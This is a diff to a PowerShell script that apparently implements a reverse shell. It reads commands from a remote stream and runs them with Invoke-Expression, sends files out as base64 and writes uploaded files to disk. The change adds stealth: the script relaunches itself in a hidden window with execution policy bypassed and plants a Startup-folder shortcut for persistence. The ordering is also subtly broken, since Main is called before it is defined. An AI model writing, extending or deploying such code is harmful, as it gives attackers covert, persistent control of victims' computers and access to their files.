@@ -19,71 +19,81 @@ $ScriptPath = $MyInvocation.MyCommand.Path
 # Define the path for the shortcut
 $ShortcutPath = [System.IO.Path]::Combine($StartupFolder, 'MyScript.lnk') # Edit the filename to fit your needs
 
-# Check if the shortcut already exists
-if (Test-Path $ShortcutPath) {
-    Write-Host "Shortcut already exists: $ShortcutPath"
+# Check if the '-HiddenWindow' argument is present
+if ($args -contains '-HiddenWindow') {
+    # Check if the shortcut already exists
+    if (Test-Path $ShortcutPath) {
+        Write-Host "Shortcut already exists: $ShortcutPath"
+    } else {
+        # Create a WScript.Shell COM object
+        $WScriptShell = New-Object -ComObject WScript.Shell
+
+        # Create the shortcut
+        $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
+        $Shortcut.TargetPath = 'powershell.exe'
+        $Shortcut.Arguments = "-WindowStyle hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
+        $Shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($ScriptPath)
+        $Shortcut.Save()
+
+        Write-Host "Shortcut created in Startup folder: $ShortcutPath"
+    }
+    Main
 } else {
-    # Create a WScript.Shell COM object
-    $WScriptShell = New-Object -ComObject WScript.Shell
-
-    # Create the shortcut
-    $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
-    $Shortcut.TargetPath = 'powershell.exe'
-    $Shortcut.Arguments = "-WindowStyle hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
-    $Shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($ScriptPath)
-    $Shortcut.Save()
-
-    Write-Host "Shortcut created in Startup folder: $ShortcutPath"
+    Write-Output "Script is running in normal mode."
+    Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "& {`'$ScriptPath`' -HiddenWindow}"'
 }
 
-while ($true) {
-    $writer.Write("PS> ")
-    $writer.Flush()
-    $cmd = $reader.ReadLine()
+function Main {
+    # Main shell loop
+    while ($true) {
+        $writer.Write("PS> ")
+        $writer.Flush()
+        $cmd = $reader.ReadLine()
 
-    if ($cmd -eq "exit") { break }
+        if ($cmd -eq "exit") { break }
     
-    # Handle file download command
-    elseif ($cmd.StartsWith("Get-Content")) {
-        try {
-            $filePath = $cmd -replace 'Get-Content -Path ', '' -replace ' -Encoding Byte', ''
-            $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
-            $response = [Convert]::ToBase64String($fileBytes)
-        } catch {
-            $response = "Error: Unable to read file - " + $_.Exception.Message
-        }
-        $writer.WriteLine($response)
-        $writer.Flush()
-    }
-
-    # Handle file upload command
-    elseif ($cmd.StartsWith("Set-Content")) {
-        try {
-            $pattern = "Set-Content -Path (.+) -Value \[System.Convert\]::FromBase64String'(.+)' -Encoding Byte"
-            if ($cmd -match $pattern) {
-                $filePath = $matches[1]
-                $fileContentBase64 = $matches[2]
-                $fileBytes = [Convert]::FromBase64String($fileContentBase64)
-                [System.IO.File]::WriteAllBytes($filePath, $fileBytes)
-                $response = "File uploaded successfully to $filePath"
-            } else {
-                $response = "Error: Invalid upload command format."
+        # Handle file download command
+        elseif ($cmd.StartsWith("Get-Content")) {
+           try {
+               $filePath = $cmd -replace 'Get-Content -Path ', '' -replace ' -Encoding Byte', ''
+                $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+                $response = [Convert]::ToBase64String($fileBytes)
+            } catch {
+                $response = "Error: Unable to read file - " + $_.Exception.Message
             }
-        } catch {
-            $response = "Error: Unable to write file - " + $_.Exception.Message
+            $writer.WriteLine($response)
+            $writer.Flush()
         }
-        $writer.WriteLine($response)
-        $writer.Flush()
-    }
 
-    else {
-        try {
-            $output = Invoke-Expression $cmd 2>&1 | Out-String
-            $writer.WriteLine($output)
+        # Handle file upload command
+        elseif ($cmd.StartsWith("Set-Content")) {
+            try {
+                $pattern = "Set-Content -Path (.+) -Value \[System.Convert\]::FromBase64String'(.+)' -Encoding Byte"
+                if ($cmd -match $pattern) {
+                    $filePath = $matches[1]
+                    $fileContentBase64 = $matches[2]
+                    $fileBytes = [Convert]::FromBase64String($fileContentBase64)
+                    [System.IO.File]::WriteAllBytes($filePath, $fileBytes)
+                    $response = "File uploaded successfully to $filePath"
+              } else {
+                    $response = "Error: Invalid upload command format."
+                }
+            } catch {
+                $response = "Error: Unable to write file - " + $_.Exception.Message
+            }
+            $writer.WriteLine($response)
             $writer.Flush()
-        } catch {
-            $writer.WriteLine("Error: " + $_.Exception.Message)
-            $writer.Flush()
+        }
+
+        else {
+            try {
+                $output = Invoke-Expression $cmd 2>&1 | Out-String
+                $writer.WriteLine($output)
+                $writer.Flush()
+            } catch {
+                $writer.WriteLine("Error: " + $_.Exception.Message)
+                $writer.Flush()
+            }
         }
     }
 }
